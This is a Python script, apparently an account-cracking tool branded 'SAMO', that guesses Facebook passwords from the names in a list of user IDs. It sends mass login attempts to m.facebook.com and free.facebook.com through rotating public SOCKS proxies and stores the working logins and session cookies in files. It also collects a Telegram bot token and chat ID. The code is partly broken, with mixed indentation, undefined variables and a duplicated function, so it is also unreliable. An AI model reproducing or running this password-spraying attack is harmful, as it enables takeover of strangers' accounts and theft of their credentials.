import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from datetime import *
print("TOLL WORKING @krd_crackers")
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

pretty.install()
CON=sol() 
id_my = input(' ID TELEGRAME XOT DANE = ')
token_my = input(' TOOKENE BOTE TELEGRAMT DANE = ')

#                         USER-AGEANT                           #
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
	prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,m])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush()
def clear():
	os.system('clear')
def back():
	login()
import marshal
def banner():
	clear()
	print("""%s\033[1;31m
 $$$$$$\   $$$$$$\  $$\      $$\  $$$$$$\  
$$  __$$\ $$  __$$\ $$$\    $$$ |$$  __$$\ 
$$ /  \__|$$ /  $$ |$$$$\  $$$$ |$$ /  $$ |
\$$$$$$\  $$$$$$$$ |$$\$$\$$ $$ |$$ |  $$ |
 \____$$\ $$  __$$ |$$ \$$$  $$ |$$ |  $$ |
$$\   $$ |$$ |  $$ |$$ |\$  /$$ |$$ |  $$ |
\$$$$$$  |$$ |  $$ |$$ | \_/ $$ | $$$$$$  |
 \______/ \__|  \__|\__|     \__| \______/ 

\033[1;31m﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉

= = = = = = = = = = = = = = = = 
Tool maded by @i4m_s4m0

Telegram : @i4m_s4m0

Channeal : https://t.me/RASHA_KRACKER

Version : V0.2
\033[1;31m---------------------------------
"""%(O))

os.system('clear')
logo ="""%s \033[31;1m

 $$$$$$\   $$$$$$\  $$\      $$\  $$$$$$\  
$$  __$$\ $$  __$$\ $$$\    $$$ |$$  __$$\ 
$$ /  \__|$$ /  $$ |$$$$\  $$$$ |$$ /  $$ |
\$$$$$$\  $$$$$$$$ |$$\$$\$$ $$ |$$ |  $$ |
 \____$$\ $$  __$$ |$$ \$$$  $$ |$$ |  $$ |
$$\   $$ |$$ |  $$ |$$ |\$  /$$ |$$ |  $$ |
\$$$$$$  |$$ |  $$ |$$ | \_/ $$ | $$$$$$  |
 \______/ \__|  \__|\__|     \__| \______/ 

\033[1;31m﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉
"""
def menu():
	os.system('clear')
	banner()
	print('')
	print(' \033[1;92m[ 1 ] CRACK FILE  ')
	print('')
	TANYA = input(' \033[1;31mCHOOSE = ')
	if TANYA in ['1','01']:
		FILE()
		print('')
		exit()
##########
def FILE():
	os.system('clear')
	banner()
	try:
		win = '# Enter File Path '
		win2 = mark(win, style='green')
		sol().print(win2)
		print('')
		virat = input(' \033[1;31mENTER YOUR FILE NAME... =  ')
		for line in open(virat, 'r').readlines():
			id.append(line.strip())
		print(' TOTAL ID '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print(' ✘ Eroor  ')
			exit()
	except (KeyError,IOError):
			print(' ✘ error File ')
			time.sleep(3)
			follower()
#########
def setting():
	os.system('clear')
	banner()
	print(' \033[1;93mID NEW [ 1 ] = ')
	print('')
	print(' \033[1;93mID OLD [ 2 ] = ')
	print('')
	print(' \033[1;93m RANDOM [OLD-NEW] [ 3 ] = ')
	print('')
	hu = input(' \033[1;92m└──SELECT = ')
	print('')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('')
		exit()
	os.system('clear')
	banner()
	if ['1','01']:
		os.system('1')
		method.append('mobile')
	else:
		method.append('mobile')
	passwrd()
def passwrd():
	os.system('clear')
	banner()
	if ['1','01']:
		os.system('1')
		password()
def passwrd():
	os.system('clear')
	banner()
	print("")
	print(" TOTAL ID : "+str(len(id)))
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+'1212')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append("123"+frs)
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append("123456"+frs)
					pwv.append("1234567"+frs)
					pwv.append("12345678"+frs)
					pwv.append("123456789"+frs)
					pwv.append(frs+'123321')
					pwv.append(frs+'112233')
					pwv.append('22446688')
					pwv.append('07500750')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+'1212')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append("123"+frs)
					pwv.append("1234"+frs)
					pwv.append("12345"+frs)
					pwv.append("123456"+frs)
					pwv.append("1234567"+frs)
					pwv.append("12345678"+frs)
					pwv.append("123456789"+frs)
					pwv.append(frs+'123321')
					pwv.append(frs+'112233')
					pwv.append('22446688')
					pwv.append('07500750')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;96m THANKS FOR SUPPORTING')
	print('')
	exit()
###                         Method                          ###
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo} [SAMO] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{M} [ SAMO-CP ] \033[1;95m{m}{idf} | {m}{pw} | \033[1;90m{kuki}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{h} [ Samo-OK ] \033[1;34m{h}{idf} | {h}{pw} | \033[1;90m{kuki}')
				os.system('espeak -a 300 " SAMO,  OK,  ID"')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------# 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SAMO]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'free.facebook.com',
            'method': 'GET',
			'scheme': 'https',
			'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-ua': '"Google Chrome";v="116", "Chromium";v="116", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980',
}
            po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[SAMO-CP] {idf} • {pw} \nTIME: {time.strftime("%H:%M")} ')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[SAMO-OK] {idf} • {pw}\n\033[0;93m[Success]= COOKIES • \033[0;92m{kuki} \nTIME: {time.strftime("%H:%M")} ')
                os.system('espeak -a 300 " SAMO,  OK,  ID"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('/storage/emulated/0/SAMO-OK/')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('mobile .prox.txt')
	except:pass
	menu()
